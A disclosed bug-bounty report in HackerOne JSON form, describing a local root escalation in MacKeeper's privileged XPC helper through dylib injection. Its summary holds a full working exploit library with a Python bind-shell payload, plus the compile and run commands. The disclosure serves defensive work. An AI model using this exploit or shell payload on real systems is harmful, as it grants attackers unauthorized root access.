{"id":750118,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTAxMTg=","url":"https://hackerone.com/reports/750118","title":"Local Privilege escalation to root via XPC","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-12-02T22:36:31.072Z","submitted_at":"2019-12-02T22:36:31.072Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"r3ggi-on-h1","url":"/r3ggi-on-h1","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":43746,"url":"https://hackerone.com/clario","handle":"clario","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/t3XRtv8dYQo3cRSYWh2iL7CE/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/t3XRtv8dYQo3cRSYWh2iL7CE/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Clario","twitter_handle":"","website":"https://clario.co/","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-14T07:01:05.656Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-05-15T07:00:49.868Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-06-14T07:00:49.980Z","allow_singular_disclosure_after":-17106325.17183465,"singular_disclosure_allowed":true,"vote_count":4,"voters":["prophet","mygf","gamliel","darkerhack"],"severity":{"rating":"high","score":7.8,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":40187,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"https://mackeeper.com/mk/download/","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6467767,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-04T17:28:04.857Z","updated_at":"2019-12-04T17:28:04.857Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6474186,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-05T15:04:07.065Z","updated_at":"2019-12-05T15:04:07.065Z","additional_data":{},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6474289,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-05T15:18:11.616Z","updated_at":"2019-12-05T15:18:11.616Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6474292,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-05T15:18:36.488Z","updated_at":"2019-12-05T15:18:36.488Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6482298,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-06T12:51:22.682Z","updated_at":"2019-12-06T12:51:22.682Z","actor":{"username":"jair","cleared":false,"url":"/jair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/N18CABo2oLzv3uDAMHznVUhh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6482444,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-06T13:16:49.648Z","updated_at":"2019-12-06T13:16:49.648Z","actor":{"username":"r3ggi-on-h1","cleared":false,"url":"/r3ggi-on-h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6558852,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-16T11:41:45.428Z","updated_at":"2019-12-16T11:41:45.428Z","actor":{"url":"/clario","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/t3XRtv8dYQo3cRSYWh2iL7CE/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Clario"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"clario","collaborator":{"username":"r3ggi-on-h1","url":"/r3ggi-on-h1"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6690697,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-04T21:40:06.538Z","updated_at":"2020-01-04T21:40:06.538Z","actor":{"username":"r3ggi-on-h1","cleared":false,"url":"/r3ggi-on-h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6848494,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-23T10:38:04.741Z","updated_at":"2020-01-23T10:38:04.741Z","actor":{"username":"jair","cleared":false,"url":"/jair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/N18CABo2oLzv3uDAMHznVUhh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"r3ggi-on-h1","url":"/r3ggi-on-h1"},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6848562,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-23T10:46:53.255Z","updated_at":"2020-01-23T10:46:53.255Z","actor":{"username":"r3ggi-on-h1","cleared":false,"url":"/r3ggi-on-h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7032465,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-12T14:39:03.360Z","updated_at":"2020-02-12T14:39:03.360Z","actor":{"username":"r3ggi-on-h1","cleared":false,"url":"/r3ggi-on-h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7032651,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-12T15:05:46.423Z","updated_at":"2020-02-12T15:05:46.423Z","actor":{"username":"jair","cleared":false,"url":"/jair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/N18CABo2oLzv3uDAMHznVUhh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7066277,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-16T20:54:45.674Z","updated_at":"2020-02-16T20:54:45.674Z","actor":{"username":"r3ggi-on-h1","cleared":false,"url":"/r3ggi-on-h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7620280,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-10T18:49:51.815Z","updated_at":"2020-04-10T18:49:51.815Z","actor":{"username":"r3ggi-on-h1","cleared":false,"url":"/r3ggi-on-h1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8006906,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-15T07:00:49.892Z","updated_at":"2020-05-15T07:00:49.892Z","first_to_agree":true,"actor":{"username":"jair","cleared":false,"url":"/jair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/N18CABo2oLzv3uDAMHznVUhh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8285604,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-14T07:01:05.709Z","updated_at":"2020-06-14T07:01:05.709Z","actor":{"url":"/clario","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/t3XRtv8dYQo3cRSYWh2iL7CE/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Clario"}},"genius_execution_id":null,"team_handle":"clario","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":21705,"category":"team","content":"### Summary\nThe application is divided into a few parts responsible for different actions. The standard, running with user permissions parts are:\n\nMacKeeper\nMacKeeperAgent MacKeeper communicates with more privileged (root) part named com.mackeeper.MacKeeperPrivilegedHelper that is located in the /Library/PrivilegedHelperTools/ directory. The communication is done via the NSXPC mechanism.\nWhile establishing the connection, the com.mackeeper.MacKeeperPrivilegedHelper has to ensure that the connecting process is the MacKeeperAgent in order to mitigate privilege escalation bugs. To do so, the -[MKKeenowVPN listener:shouldAcceptNewConnection:] method is used. Inside that method, you check if the connecting process has been signed with the same Developer Certificate that com.mackeeper.MacKeeperPrivilegedHelper was.\n\nThe problem is that an attacker is able to inject a malicious code into validly signed MacKeeper executable file via DYLD_INSERT_LIBRARIES environment variable and establish a valid XPC connection.\n\n### Steps to reproduce\nTo prepare this PoC I downloaded older version of MacKeeper (4.6.2) that has no 'Hardened Runtime' capability turned on but is still signed with the same Developer Certificate. Note, that we're going to connect to the newest version of Mackeeper.\nAfter we downloaded a 'trampoline' executable, we need to prepare a malicious dynamic library that we are going to inject. The code below:\n\n```\n#import \u003cFoundation/Foundation.h\u003e\n\n@protocol MKIKeenowVPN\n@property(readonly, nonatomic) BOOL available;\n- (void)resetPassword:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)closeClientWithEmail:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)getAccountExpDateWithCallBack:(void (^)(NSDate *, unsigned long long))arg1;\n- (void)getAccountCredentialWithCallBack:(void (^)(NSString *, NSString *, unsigned long long))arg1;\n- (void)getAccountTypeWithCallBack:(void (^)(NSString *, unsigned long long))arg1;\n- (void)loginWithEmail:(NSString *)arg1 password:(NSString *)arg2 callback:(void (^)(unsigned long long))arg3;\n- (void)addClientWithEmail:(NSString *)arg1 password:(NSString *)arg2 countryCode:(NSString *)arg3 type:(NSString *)arg4 callback:(void (^)(unsigned long long))arg5;\n- (void)setEncryptionType:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)checkAESSupportWithCallback:(void (^)(BOOL))arg1;\n- (void)retrieveBandwidthForServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)pingServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long, unsigned long long, unsigned long long))arg2;\n- (void)checkOpenPortWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(BOOL))arg4;\n- (void)retrieveVPNStatusWithCallback:(void (^)(BOOL, unsigned long long))arg1;\n- (void)stopVPNConnectionWithCallback:(void (^)(unsigned long long))arg1;\n- (void)startVPNConnectionWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(unsigned long long))arg4;\n- (void)getServerListWithCallback:(void (^)(NSArray *, unsigned long long))arg1;\n- (void)finalize;\n- (void)initializeWithOpenVPNPath:(NSString *)arg1 callback:(void (^)(BOOL))arg2;\n@end\n\n@protocol MKIKeenowVPNObserver\n- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1;\n- (void)privilegedVPNStateDidChange:(unsigned long long)arg1;\n@end\n\n@interface MacKeeperMaliciousLibrary : NSObject \u003cMKIKeenowVPNObserver\u003e\n- (void)startXPCConnection;\n@end\n\n@implementation MacKeeperMaliciousLibrary\n- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1 {\n    NSLog(@\"[+] privilegedVPNIOCountDidChange CALLED with %llu\", arg1);\n}\n- (void)privilegedVPNStateDidChange:(unsigned long long)arg1 {\n    NSLog(@\"[+] privilegedVPNStateDidChange CALLED with %llu\", arg1);\n}\n- (instancetype)init\n{\n    self = [super init];\n    if (self) {\n        [self startXPCConnection];\n    }\n    return self;\n}\n- (void)startXPCConnection {\n    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPN)];\n    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:@\"com.mackeeper.MacKeeperPrivilegedHelperMKIKeenowVPN.mach\" options:NSXPCConnectionPrivileged];\n    xpcConnection.remoteObjectInterface = remoteInterface;\n    xpcConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPNObserver)];\n    xpcConnection.exportedObject = self;\n\n    xpcConnection.interruptionHandler = ^{\n        NSLog(@\"Connection Terminated\");\n    };\n\n    xpcConnection.invalidationHandler = ^{\n        NSLog(@\"Connection Invalidated\");\n    };\n\n    [xpcConnection resume];\n\n    [xpcConnection.remoteObjectProxy initializeWithOpenVPNPath:@\"/tmp/rootshell.sh\" callback:^(BOOL success) {\n        NSLog(@\"initializeWithOpenVPNPath? %d\", success);\n    }];\n\n    sleep(1);\n\n    [xpcConnection.remoteObjectProxy startVPNConnectionWithIP:@\"127.0.0.1\" protocol:@\"TCP\" port:@\"8888\" callback:^(unsigned long long success) {\n        NSLog(@\"startVPNConnectionWithIP? %llu\", success);\n    }];\n\n    sleep(1);\n}\n\n@end\n\n__attribute__((constructor)) static void pwn() {\n\n    NSString *rootshell = @\"/usr/local/bin/python3 -c \\\"import os;import pty;import socket;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('127.0.0.1', 31337));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn('/bin/bash');s.close()\\\"\";\n    [rootshell writeToFile:@\"/tmp/rootshell.sh\" atomically:YES encoding:NSUTF8StringEncoding error:nil];\n\n    NSLog(@\"[!] DYLIB SUCCESSFULLY INJECTED\");\n    [MacKeeperMaliciousLibrary new];\n    exit(-3);\n}\n```\nCompile the lib using gcc:\n```\ngcc -dynamiclib malicious_library.m -o libMacKeeperMaliciousLibrary.dylib -lobjc -framework Foundation\n```\n\nRun following command:\n```\nDYLD_INSERT_LIBRARIES=./libMacKeeperMaliciousLibrary.dylib ./MacKeeper_old.app/Contents/MacOS/MacKeeper\n```\n\nIf the exploit succeeded the rootshell should be spawned (screen attached). If not, try to kill `com.mackeeper.MacKeeperPrivilegedHelper` and immediately run the exploit again.","can_view?":true,"can_edit?":false,"content_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eThe application is divided into a few parts responsible for different actions. The standard, running with user permissions parts are:\u003c/p\u003e\n\n\u003cp\u003eMacKeeper\u003cbr\u003e\nMacKeeperAgent MacKeeper communicates with more privileged (root) part named com.mackeeper.MacKeeperPrivilegedHelper that is located in the /Library/PrivilegedHelperTools/ directory. The communication is done via the NSXPC mechanism.\u003cbr\u003e\nWhile establishing the connection, the com.mackeeper.MacKeeperPrivilegedHelper has to ensure that the connecting process is the MacKeeperAgent in order to mitigate privilege escalation bugs. To do so, the -[MKKeenowVPN listener:shouldAcceptNewConnection:] method is used. Inside that method, you check if the connecting process has been signed with the same Developer Certificate that com.mackeeper.MacKeeperPrivilegedHelper was.\u003c/p\u003e\n\n\u003cp\u003eThe problem is that an attacker is able to inject a malicious code into validly signed MacKeeper executable file via DYLD_INSERT_LIBRARIES environment variable and establish a valid XPC connection.\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003cp\u003eTo prepare this PoC I downloaded older version of MacKeeper (4.6.2) that has no \u0026#39;Hardened Runtime\u0026#39; capability turned on but is still signed with the same Developer Certificate. Note, that we\u0026#39;re going to connect to the newest version of Mackeeper.\u003cbr\u003e\nAfter we downloaded a \u0026#39;trampoline\u0026#39; executable, we need to prepare a malicious dynamic library that we are going to inject. The code below:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e#import \u0026lt;Foundation/Foundation.h\u0026gt;\n\n@protocol MKIKeenowVPN\n@property(readonly, nonatomic) BOOL available;\n- (void)resetPassword:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)closeClientWithEmail:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)getAccountExpDateWithCallBack:(void (^)(NSDate *, unsigned long long))arg1;\n- (void)getAccountCredentialWithCallBack:(void (^)(NSString *, NSString *, unsigned long long))arg1;\n- (void)getAccountTypeWithCallBack:(void (^)(NSString *, unsigned long long))arg1;\n- (void)loginWithEmail:(NSString *)arg1 password:(NSString *)arg2 callback:(void (^)(unsigned long long))arg3;\n- (void)addClientWithEmail:(NSString *)arg1 password:(NSString *)arg2 countryCode:(NSString *)arg3 type:(NSString *)arg4 callback:(void (^)(unsigned long long))arg5;\n- (void)setEncryptionType:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)checkAESSupportWithCallback:(void (^)(BOOL))arg1;\n- (void)retrieveBandwidthForServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)pingServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long, unsigned long long, unsigned long long))arg2;\n- (void)checkOpenPortWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(BOOL))arg4;\n- (void)retrieveVPNStatusWithCallback:(void (^)(BOOL, unsigned long long))arg1;\n- (void)stopVPNConnectionWithCallback:(void (^)(unsigned long long))arg1;\n- (void)startVPNConnectionWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(unsigned long long))arg4;\n- (void)getServerListWithCallback:(void (^)(NSArray *, unsigned long long))arg1;\n- (void)finalize;\n- (void)initializeWithOpenVPNPath:(NSString *)arg1 callback:(void (^)(BOOL))arg2;\n@end\n\n@protocol MKIKeenowVPNObserver\n- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1;\n- (void)privilegedVPNStateDidChange:(unsigned long long)arg1;\n@end\n\n@interface MacKeeperMaliciousLibrary : NSObject \u0026lt;MKIKeenowVPNObserver\u0026gt;\n- (void)startXPCConnection;\n@end\n\n@implementation MacKeeperMaliciousLibrary\n- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1 {\n    NSLog(@\u0026quot;[+] privilegedVPNIOCountDidChange CALLED with %llu\u0026quot;, arg1);\n}\n- (void)privilegedVPNStateDidChange:(unsigned long long)arg1 {\n    NSLog(@\u0026quot;[+] privilegedVPNStateDidChange CALLED with %llu\u0026quot;, arg1);\n}\n- (instancetype)init\n{\n    self = [super init];\n    if (self) {\n        [self startXPCConnection];\n    }\n    return self;\n}\n- (void)startXPCConnection {\n    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPN)];\n    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:@\u0026quot;com.mackeeper.MacKeeperPrivilegedHelperMKIKeenowVPN.mach\u0026quot; options:NSXPCConnectionPrivileged];\n    xpcConnection.remoteObjectInterface = remoteInterface;\n    xpcConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPNObserver)];\n    xpcConnection.exportedObject = self;\n\n    xpcConnection.interruptionHandler = ^{\n        NSLog(@\u0026quot;Connection Terminated\u0026quot;);\n    };\n\n    xpcConnection.invalidationHandler = ^{\n        NSLog(@\u0026quot;Connection Invalidated\u0026quot;);\n    };\n\n    [xpcConnection resume];\n\n    [xpcConnection.remoteObjectProxy initializeWithOpenVPNPath:@\u0026quot;/tmp/rootshell.sh\u0026quot; callback:^(BOOL success) {\n        NSLog(@\u0026quot;initializeWithOpenVPNPath? %d\u0026quot;, success);\n    }];\n\n    sleep(1);\n\n    [xpcConnection.remoteObjectProxy startVPNConnectionWithIP:@\u0026quot;127.0.0.1\u0026quot; protocol:@\u0026quot;TCP\u0026quot; port:@\u0026quot;8888\u0026quot; callback:^(unsigned long long success) {\n        NSLog(@\u0026quot;startVPNConnectionWithIP? %llu\u0026quot;, success);\n    }];\n\n    sleep(1);\n}\n\n@end\n\n__attribute__((constructor)) static void pwn() {\n\n    NSString *rootshell = @\u0026quot;/usr/local/bin/python3 -c \\\u0026quot;import os;import pty;import socket;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\u0026#39;127.0.0.1\u0026#39;, 31337));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn(\u0026#39;/bin/bash\u0026#39;);s.close()\\\u0026quot;\u0026quot;;\n    [rootshell writeToFile:@\u0026quot;/tmp/rootshell.sh\u0026quot; atomically:YES encoding:NSUTF8StringEncoding error:nil];\n\n    NSLog(@\u0026quot;[!] DYLIB SUCCESSFULLY INJECTED\u0026quot;);\n    [MacKeeperMaliciousLibrary new];\n    exit(-3);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCompile the lib using gcc:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egcc -dynamiclib malicious_library.m -o libMacKeeperMaliciousLibrary.dylib -lobjc -framework Foundation\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRun following command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDYLD_INSERT_LIBRARIES=./libMacKeeperMaliciousLibrary.dylib ./MacKeeper_old.app/Contents/MacOS/MacKeeper\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the exploit succeeded the rootshell should be spawned (screen attached). If not, try to kill \u003ccode\u003ecom.mackeeper.MacKeeperPrivilegedHelper\u003c/code\u003e and immediately run the exploit again.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}